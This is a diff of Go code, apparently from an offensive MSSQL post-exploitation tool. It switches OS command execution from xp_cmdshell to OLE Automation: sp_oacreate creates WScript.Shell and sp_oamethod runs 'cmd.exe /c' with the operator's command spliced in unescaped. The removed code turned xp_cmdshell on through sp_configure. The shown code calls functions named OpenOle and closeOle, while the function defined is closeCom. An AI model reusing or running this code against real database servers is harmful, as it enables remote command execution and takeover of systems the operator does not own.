@@ -9,7 +9,7 @@ import (
 	_ "github.com/denisenkom/go-mssqldb"
 )
 
-func Mssql1Cmd(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
+func Mssql3Cmd(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
 	result = model.SqlcmdTaskResult{SqlcmdTask: task, Result: "", Err: nil}
 
 	dataSourceName := fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v", task.Ip,
@@ -20,49 +20,21 @@ func Mssql1Cmd(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
 		log.Error(err.Error())
 	}
 	if task.Query == "close" {
-		closeCmdShell(*conn)
-		fmt.Println("Close xp_cmdshell Successful")
+		closeOle(*conn)
+		fmt.Println("Close sp_oacreate Successful")
 		return
 	}
-	Open(*conn)
-	osShell(*conn, task.Query)
+	OpenOle(*conn)
+	osShellCom(*conn, task.Query)
 
 	return result
 }
 
-func Open(conn sql.DB) {
-	value, err := conn.Prepare("select value_in_use from  sys.configurations where  name = 'xp_cmdshell'")
-	if err != nil {
-		log.Error("Prepare failed:", err.Error())
-	}
-	defer value.Close()
-
-	row := value.QueryRow()
-	//var somenumber int64
-	var v int
-	err = row.Scan(&v)
-	if err != nil {
-		log.Error("Query failed:", err.Error())
-	}
-	if v == 1 {
-		fmt.Printf("xp_cmdshell Enabled\n")
-	} else {
-		fmt.Printf("Open xp_cmdshell...\n")
-		stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
-		if err != nil {
-			//fmt.Println("Query Error", err)
-			return
-		}
-
-		defer stmt.Close()
-		stmt.Query()
-
-	}
-	return
-}
-
-func osShell(conn sql.DB, cmd string) {
-	rows, err := conn.Query(`exec master..xp_cmdshell '` + cmd + `' `)
+func osShellCom(conn sql.DB, cmd string) {
+	sqlstr := fmt.Sprint("declare @shell int,@exec int,@text int,@str varchar(8000); \n" +
+		"exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@shell output\nexec sp_oamethod @shell,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c " + cmd + "'\nexec sp_oamethod @exec, 'StdOut', @text out;\nexec sp_oamethod @text, 'ReadAll', @str out\nselect @str")
+	log.Debug(sqlstr)
+	rows, err := conn.Query(sqlstr)
 	if err != nil {
 		panic(err.Error())
 
@@ -101,8 +73,8 @@ func osShell(conn sql.DB, cmd string) {
 	}
 }
 
-func closeCmdShell(conn sql.DB) {
-	stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 0;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;")
+func closeCom(conn sql.DB) {
+	stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 0;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures', 0;RECONFIGURE;")
 
 	if err != nil {
 		log.Error("Prepare failed:", err.Error())
